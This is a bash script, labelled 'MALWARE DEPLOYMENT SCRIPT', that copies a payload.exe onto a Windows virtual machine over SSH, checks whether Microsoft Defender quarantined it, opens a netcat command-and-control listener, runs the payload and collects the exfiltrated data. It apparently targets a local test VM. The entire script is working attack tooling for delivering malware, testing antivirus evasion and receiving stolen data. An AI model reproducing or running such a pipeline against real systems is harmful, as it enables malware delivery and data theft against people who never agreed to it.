#!/bin/bash
VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
TIMEOUT=${TIMEOUT:-60}
SSH="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"
DIR="$(cd "$(dirname "$0")" && pwd)"

progress() {
    local elapsed=0 max=$1 label=$2 pid=$3
    while kill -0 "$pid" 2>/dev/null; do
        elapsed=$((elapsed + 1))
        pct=$((elapsed * 100 / max))
        [ $pct -gt 100 ] && pct=100
        bar=$(printf '%-50s' '' | tr ' ' '=' | head -c $((pct / 2)))
        printf "\r  [%-25s] %3d%%  %s (%ds)" "$bar" "$pct" "$label" "$elapsed"
        sleep 1
    done
    printf "\r  [=========================] 100%%  %s (done)   \n" "$label"
}

echo ""
echo "╔════════════════════════════════════════════╗"
echo "║         MALWARE DEPLOYMENT SCRIPT          ║"
echo "╚════════════════════════════════════════════╝"
echo ""

# Step 1: Upload
echo "▸ [1/5] Uploading payload to VM..."
eval $SCP "$DIR/payload.exe" "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\payload.exe'" 2>/dev/null
if [ $? -eq 0 ]; then echo "  ✓ Upload complete"; else echo "  ✗ Upload failed"; exit 1; fi

# Step 2: Verify binary survived Defender
echo "▸ [2/5] Checking if Defender quarantined..."
sleep 2
EXISTS=$(eval $SSH "'if exist C:\\Users\\$VM_USER\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'" 2>/dev/null)
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  ✗ QUARANTINED — Defender caught the payload"
    echo "  Detection info:"
    eval $SSH "'powershell -Command \"Get-MpThreatDetection | Select-Object -Last 1 | Format-List\"'" 2>/dev/null | sed 's/^/    /'
    exit 2
fi
echo "  ✓ Binary survived Defender"

# Step 3: Start C2 listener
echo "▸ [3/5] Starting C2 listener on :$C2_PORT..."
OUT="exfil_$(date +%Y%m%d_%H%M%S).bin"
fuser -k $C2_PORT/tcp 2>/dev/null
timeout $TIMEOUT nc -l -p $C2_PORT > "$OUT" &
C2_PID=$!
sleep 1
echo "  ✓ Listening (timeout: ${TIMEOUT}s)"

# Step 4: Execute and wait with progress
echo "▸ [4/5] Executing payload on VM..."
eval $SSH "'cmd /c \"C:\\Users\\$VM_USER\\Desktop\\payload.exe\"'" >/dev/null 2>&1 &
progress $TIMEOUT "Waiting for exfil" $C2_PID

# Step 5: Results
SIZE=$(stat -c%s "$OUT" 2>/dev/null || echo 0)
echo ""
echo "▸ [5/5] Results"
echo "  ─────────────────────────────────"
echo "  File:     $OUT"
echo "  Size:     $SIZE bytes"
if [ "$SIZE" -gt 100 ]; then
    echo "  Status:   ✓ SUCCESS"
    echo ""
    echo "  Sections:"
    strings "$OUT" | grep "^===" | sed 's/^/    /'
    echo ""
    echo "  To parse into individual files:"
    echo "    python3 parse_exfil.py $OUT"
else
    echo "  Status:   ✗ FAILED (no data received)"
    echo ""
    echo "  Troubleshooting:"
    echo "    - Is the VM running? (ssh -p $VM_PORT vmuser@localhost)"
    echo "    - Is port $C2_PORT open? (fuser $C2_PORT/tcp)"
    echo "    - Did the payload crash? (check Event Viewer on VM)"
fi
echo "  ─────────────────────────────────"
